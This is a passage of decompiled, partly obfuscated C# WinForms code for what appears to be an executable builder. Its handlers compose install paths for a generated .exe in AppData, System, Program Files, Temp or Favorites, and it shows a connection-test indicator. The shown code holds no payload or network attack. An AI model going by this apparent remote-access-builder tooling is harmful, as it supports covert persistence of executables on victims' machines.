                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        private void RadioButton3_CheckedChanged(object sender, EventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        private void RadioButton4_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void RadioButton5_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void RadioButton6_CheckedChanged(object sender, EventArgs e)
        {
        }

        public void Showit()
        {
            this.Label9.Visible = true;
            int num = 1;
            do
            {
                Thread.Sleep(10);
                Application.DoEvents();
                num++;
            }
            while (num <= 100);
            this.Label9.Visible = false;
        }

        public void StopCheck()
        {
            this.Button2.Enabled = true;
            this.thread_0.Abort();
        }

        private void TabPage7_Click(object sender, EventArgs e)
        {
        }

        private void TextBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            int num = Strings.Asc(e.KeyChar);
            if (((num < 0x30) || (num > 0x39)) && (num != 8))
            {
                e.Handled = true;
            }
        }

        private void TextBox8_TextChanged(object sender, EventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton4.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Path.GetTempPath() + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Path.GetTempPath() + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton5.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        private void TextBox9_TextChanged(object sender, EventArgs e)
        {
            if (this.RadioButton1.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton2.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.System) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
            else if (this.RadioButton3.Checked)
            {
                if (this.TextBox9.Text != null)
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox9.Text + @"\" + this.TextBox8.Text + ".exe";
                }
                else
                {
                    this.Label15.Text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\" + this.TextBox8.Text + ".exe";
                }
            }
        }

        public void ToggleConnectionResult(int success)
        {
            switch (success)
            {
                case 0:
                    this.PictureBox5.Image = Class5.smethod_86();
                    break;

                case 1:
                    this.PictureBox5.Image = Class5.smethod_22();
                    break;

                case 4:
                    this.PictureBox5.Image = null;
                    break;
            }
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual Button Button2
        {
            get
            {
                return this._Button2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button2_Click);
                if (this._Button2 != null)
                {
                    this._Button2.Click -= handler;
                }
                this._Button2 = value;
                if (this._Button2 != null)
                {
                    this._Button2.Click += handler;
                }
            }
        }

        internal virtual Button Button3
        {
            get
            {
                return this._Button3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button3_Click);
                if (this._Button3 != null)
                {
                    this._Button3.Click -= handler;
                }
                this._Button3 = value;
                if (this._Button3 != null)
                {
                    this._Button3.Click += handler;
                }
            }
        }

        internal virtual Button Button4
        {
            get
            {
                return this._Button4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button4_Click);
                if (this._Button4 != null)
                {
                    this._Button4.Click -= handler;
                }
                this._Button4 = value;
                if (this._Button4 != null)
                {
                    this._Button4.Click += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox_0
        {
            get
            {
                return this.checkBox_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.checkBox_0 = value;
            }
        }

        internal virtual CheckBox CheckBox_1
        {
            get
            {
                return this.checkBox_1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.checkBox_1 = value;
            }
        }

        internal virtual CheckBox CheckBox_2
        {
            get
            {
                return this.checkBox_2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.checkBox_2 = value;
            }
        }

        internal virtual CheckBox CheckBox_3
        {
            get
            {
                return this.checkBox_3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.checkBox_3 = value;
            }
        }

        internal virtual CheckBox CheckBox_4
        {
            get
            {
                return this.checkBox_4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.checkBox_4 = value;
            }
        }

        internal virtual CheckBox CheckBox_5
        {
            get
            {
                return this.checkBox_5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CheckBox_5_CheckedChanged);
                if (this.checkBox_5 != null)
                {
                    this.checkBox_5.CheckedChanged -= handler;
                }
                this.checkBox_5 = value;
                if (this.checkBox_5 != null)
                {
                    this.checkBox_5.CheckedChanged += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox1
        {
            get
            {
                return this._CheckBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CheckBox1_CheckedChanged);
                if (this._CheckBox1 != null)
                {
                    this._CheckBox1.CheckedChanged -= handler;
                }
                this._CheckBox1 = value;
                if (this._CheckBox1 != null)
                {
                    this._CheckBox1.CheckedChanged += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox2
        {
            get
            {
                return this._CheckBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CheckBox2_CheckedChanged);
                if (this._CheckBox2 != null)
                {
                    this._CheckBox2.CheckedChanged -= handler;
                }
                this._CheckBox2 = value;
                if (this._CheckBox2 != null)
                {
                    this._CheckBox2.CheckedChanged += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox3
        {
            get
            {
                return this._CheckBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CheckBox3_CheckedChanged);
                if (this._CheckBox3 != null)
                {
                    this._CheckBox3.CheckedChanged -= handler;
                }
                this._CheckBox3 = value;
                if (this._CheckBox3 != null)
                {
                    this._CheckBox3.CheckedChanged += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox4
        {
            get
            {
                return this._CheckBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox4 = value;
            }
        }

        internal virtual CheckBox CheckBox5
        {
            get
            {
                return this._CheckBox5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox5 = value;
            }
        }

        internal virtual CheckBox CheckBox6
        {
            get
            {
                return this._CheckBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox6 = value;
            }
        }

        internal virtual CheckBox CheckBox7
        {
            get
            {
                return this._CheckBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox7 = value;
            }
        }

        internal virtual CheckBox CheckBox8
        {
            get
            {
                return this._CheckBox8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox8 = value;
            }
        }

        internal virtual CheckBox CheckBox9
        {
            get
            {
                return this._CheckBox9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._CheckBox9 = value;
            }
        }

        internal virtual GroupBox GroupBox_0
        {
            get
            {
                return this.groupBox_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.groupBox_0 = value;
            }
        }

        internal virtual GroupBox GroupBox1
        {
            get
            {
                return this._GroupBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox1 = value;
            }
        }

        internal virtual GroupBox GroupBox2
        {
            get
            {
                return this._GroupBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox2 = value;
            }
        }

        internal virtual GroupBox GroupBox3
        {
            get
            {
                return this._GroupBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox3 = value;
            }
        }

        internal virtual GroupBox GroupBox4
        {
            get
            {
                return this._GroupBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox4 = value;
            }
        }

        internal virtual GroupBox GroupBox5
        {
            get
            {
                return this._GroupBox5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox5 = value;
            }
        }

        internal virtual GroupBox GroupBox6
        {
            get
            {
                return this._GroupBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox6 = value;
            }
        }

        internal virtual GroupBox GroupBox7
        {
            get
            {
                return this._GroupBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox7 = value;
            }
        }

        internal virtual GroupBox GroupBox8
        {
            get
            {
                return this._GroupBox8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox8 = value;
            }
        }

        internal virtual GroupBox GroupBox9
        {
            get
            {
                return this._GroupBox9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._GroupBox9 = value;
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label10
        {
            get
            {
                return this._Label10;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label10 = value;
            }
        }

        internal virtual Label Label11
        {
            get
            {
                return this._Label11;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label11 = value;
            }
        }

        internal virtual Label Label12
        {
            get
            {
                return this._Label12;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label12 = value;
            }
        }

        internal virtual Label Label13
        {
            get
            {
                return this._Label13;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label13 = value;
            }
        }

        internal virtual Label Label14
        {
            get
            {
                return this._Label14;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label14 = value;
            }
        }

        internal virtual Label Label15
        {
            get
            {
                return this._Label15;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label15 = value;
            }
        }

        internal virtual Label Label16
        {
            get
            {
                return this._Label16;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label16 = value;
            }
        }

        internal virtual Label Label17
        {
            get
            {
                return this._Label17;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label17 = value;
            }
        }

        internal virtual Label Label18
        {
            get
            {
                return this._Label18;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label18 = value;
            }
        }

        internal virtual Label Label19
        {
            get
            {
                return this.YrTaPhYjR;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.YrTaPhYjR = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual Label Label20
        {
            get
            {
                return this._Label20;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label20 = value;
            }
        }

        internal virtual Label Label3
        {
            get
            {
                return this._Label3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label3 = value;
            }
        }

        internal virtual Label Label4
        {
            get
            {
                return this._Label4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label4 = value;
            }
        }

        internal virtual Label Label5
        {
            get
            {
                return this._Label5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label5 = value;
            }
        }

        internal virtual Label Label6
        {
            get
            {
                return this._Label6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label6 = value;
            }
        }

        internal virtual Label Label7
        {
            get
            {
                return this._Label7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label7 = value;
            }
        }

        internal virtual Label Label8
        {
            get
            {
                return this._Label8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label8 = value;
            }
        }

        internal virtual Label Label9
        {
            get
            {
                return this._Label9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label9 = value;
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }

        internal virtual PictureBox PictureBox2
        {
            get
            {
                return this.hpyZaNmIi;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.hpyZaNmIi = value;
            }
        }

        internal virtual PictureBox PictureBox3
        {
            get
            {
                return this._PictureBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox3 = value;
            }
        }

        internal virtual PictureBox PictureBox4
        {
            get
            {
                return this._PictureBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox4 = value;
            }
        }

        internal virtual PictureBox PictureBox5
        {
            get
            {
                return this._PictureBox5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox5 = value;
            }
        }

        internal virtual PictureBox PictureBox6
        {
            get
            {
                return this._PictureBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox6 = value;
            }
        }

        internal virtual PictureBox PictureBox7
        {
            get
            {
                return this._PictureBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox7 = value;
            }
        }

        internal virtual RadioButton RadioButton1
        {
            get
            {
                return this._RadioButton1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton1_CheckedChanged);
                if (this._RadioButton1 != null)
                {
                    this._RadioButton1.CheckedChanged -= handler;
                }
                this._RadioButton1 = value;
                if (this._RadioButton1 != null)
                {
                    this._RadioButton1.CheckedChanged += handler;
                }
            }
        }

        internal virtual RadioButton RadioButton2
        {
            get
            {
                return this._RadioButton2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton2_CheckedChanged);
                if (this._RadioButton2 != null)
                {
                    this._RadioButton2.CheckedChanged -= handler;
                }
                this._RadioButton2 = value;
                if (this._RadioButton2 != null)
                {
                    this._RadioButton2.CheckedChanged += handler;
                }
            }
        }

        internal virtual RadioButton RadioButton3
        {
            get
            {
                return this._RadioButton3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton3_CheckedChanged);
                if (this._RadioButton3 != null)
                {
                    this._RadioButton3.CheckedChanged -= handler;
                }
                this._RadioButton3 = value;
                if (this._RadioButton3 != null)
                {
                    this._RadioButton3.CheckedChanged += handler;
                }
            }
        }

        internal virtual RadioButton RadioButton4
        {
            get
            {
                return this._RadioButton4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton4_CheckedChanged);
                if (this._RadioButton4 != null)
                {
                    this._RadioButton4.CheckedChanged -= handler;
                }
                this._RadioButton4 = value;
                if (this._RadioButton4 != null)
                {
                    this._RadioButton4.CheckedChanged += handler;
                }
            }
        }

        internal virtual RadioButton RadioButton5
        {
            get
            {
                return this._RadioButton5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton5_CheckedChanged);
                if (this._RadioButton5 != null)
                {
                    this._RadioButton5.CheckedChanged -= handler;
                }
                this._RadioButton5 = value;
                if (this._RadioButton5 != null)
                {
                    this._RadioButton5.CheckedChanged += handler;
                }
            }
        }

        internal virtual RadioButton RadioButton6
        {
            get
            {
                return this._RadioButton6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RadioButton6_CheckedChanged);
                if (this._RadioButton6 != null)
                {
                    this._RadioButton6.CheckedChanged -= handler;
                }
                this._RadioButton6 = value;
                if (this._RadioButton6 != null)
                {
                    this._RadioButton6.CheckedChanged += handler;
                }
            }
        }

        internal virtual Control0 SideTab1
        {
            get
            {
                return this._SideTab1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SideTab1 = value;
            }
        }

        internal virtual TabPage TabPage1
        {
            get
            {
                return this._TabPage1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage1 = value;
            }
        }

        internal virtual TabPage TabPage2
        {
            get
            {
                return this._TabPage2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage2 = value;
            }
        }

        internal virtual TabPage TabPage3
        {
            get
            {
                return this._TabPage3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage3 = value;
            }
        }

        internal virtual TabPage TabPage4
        {
            get
            {
                return this._TabPage4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage4 = value;
            }
        }

        internal virtual TabPage TabPage5
        {
            get
            {
                return this._TabPage5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage5 = value;
            }
        }

        internal virtual TabPage TabPage6
        {
            get
            {
                return this._TabPage6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage6 = value;
            }
        }

        internal virtual TabPage TabPage7
        {
            get
            {
                return this._TabPage7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TabPage7_Click);
                if (this._TabPage7 != null)
                {
                    this._TabPage7.Click -= handler;
                }
                this._TabPage7 = value;
                if (this._TabPage7 != null)
                {
                    this._TabPage7.Click += handler;
                }
            }
        }

        internal virtual TextBox TextBox_0
        {
            get
            {
                return this.textBox_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.textBox_0 = value;
            }
        }

        internal virtual TextBox TextBox_1
        {
            get
            {
                return this.textBox_1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.textBox_1 = value;
            }
        }

        internal virtual TextBox TextBox_2
        {
            get
            {
                return this.textBox_2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.textBox_2 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                KeyPressEventHandler handler = new KeyPressEventHandler(this.TextBox2_KeyPress);
                if (this._TextBox2 != null)
                {
                    this._TextBox2.KeyPress -= handler;
                }
                this._TextBox2 = value;
                if (this._TextBox2 != null)
                {
                    this._TextBox2.KeyPress += handler;
                }
            }
        }

        internal virtual TextBox TextBox3
        {
            get
            {
                return this._TextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox3 = value;
            }
        }

        internal virtual TextBox TextBox4
        {
            get
            {
                return this._TextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox4 = value;
            }
        }

        internal virtual TextBox TextBox5
        {
            get
            {
                return this._TextBox5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox5 = value;
            }
        }

        internal virtual TextBox TextBox6
        {
            get
            {
                return this._TextBox6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox6 = value;
            }
        }

        internal virtual TextBox TextBox7
        {
            get
            {
                return this._TextBox7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox7 = value;
            }
        }

        internal virtual TextBox TextBox8
        {
            get
            {
                return this._TextBox8;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox8_TextChanged);
                if (this._TextBox8 != null)
                {
                    this._TextBox8.TextChanged -= handler;
                }
                this._TextBox8 = value;
                if (this._TextBox8 != null)
                {
                    this._TextBox8.TextChanged += handler;
                }
            }
        }

        internal virtual TextBox TextBox9
        {
            get
            {
                return this._TextBox9;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox9_TextChanged);
                if (this._TextBox9 != null)
                {
                    this._TextBox9.TextChanged -= handler;
                }
                this._TextBox9 = value;
                if (this._TextBox9 != null)
                {
                    this._TextBox9.TextChanged += handler;
                }
            }
        }

        internal virtual ToolTip ToolTip1
        {
            get
            {
                return this.toolTip_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.toolTip_0 = value;
            }
        }

        internal virtual Win8Progressbar Win8Progressbar1
        {
            get
            {
                return this._Win8Progressbar1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Win8Progressbar1 = value;
            }
        }

        public delegate void DelegateStopCheck();

        public delegate void DelegateToggleConnectionResult(int success);

        public delegate void DelShowit();
    }
}

